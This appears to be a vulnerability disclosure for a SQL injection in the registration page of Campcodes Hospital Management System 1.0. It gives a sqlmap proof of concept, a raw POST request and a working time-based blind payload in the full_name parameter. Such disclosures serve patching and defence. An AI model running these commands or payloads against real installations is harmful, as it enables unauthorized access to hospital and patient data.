# Hospital Management System 1.0 - sqli in /hms/registration.php

- Vendor Homepage: https://www.campcodes.com
- Software Link: https://www.campcodes.com/projects/online-hospital-management-system-using-php-and-mysql/
- Version: 1.0

### POC

```
sqlmap -u "http://localhost/hospital/hms/registration.php" --data="full_name=test&address=test&city=test&gender=male&email=test@example.com&password=test123&password_again=test123&submit=Submit" --level=2 --thread=10 --batch --flush-session
```



OR

#### request.txt

```http
POST /hospital/hms/registration.php HTTP/1.1
Host: 192.168.177.1
Origin: http://192.168.177.1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=b4ao6mmdbco1bcmr84grm25ihd
Priority: u=0, i
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://192.168.177.1/hospital/hms/registration.php
Content-Length: 119

full_name=test&address=test&city=test&gender=female&email=test%40test.com&password=123456&password_again=123456&submit=
```

```
sqlmap -r request.txt -p full_name --technique T --batch --level 5
```

![image-20250530164908643](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505301649739.png)

```
---
Parameter: full_name (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: full_name=test'+(SELECT 0x6f626a70 WHERE 9939=9939 AND (SELECT 4907 FROM (SELECT(SLEEP(5)))VjxU))+'&address=test&city=test&gender=female&email=test@test.com&password=123456&password_again=123456&submit=
---
```
